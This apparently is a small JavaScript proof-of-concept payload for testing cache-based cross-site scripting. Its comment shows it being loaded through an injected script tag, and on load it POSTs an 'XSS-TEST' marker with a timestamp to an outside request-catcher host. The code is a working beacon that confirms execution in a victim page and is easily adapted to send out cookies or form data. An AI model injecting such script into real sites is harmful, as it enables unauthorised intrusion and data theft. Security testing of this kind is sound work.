//Authoer: JDL
//<script src="https://jdl-84.github.io/CACHE-XSS/SimpleExfiltrate.js"></script> 
var CurrDT          = new Date();
var TimeAsMS        = CurrDT.getTime();
var Toilet = "https://ptsv2.com/t/qo33d-1598654477";

function ExfiltrateData(ID)
{	
	 //Send Request to Toilet - Thirdparty POST catcher. 
	 const xhr = new XMLHttpRequest();
	 xhr.open("POST", Toilet+"/post", true);
	 xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	 xhr.send("XSS-TEST-"+ID);	
}

ExfiltrateData(TimeAsMS);
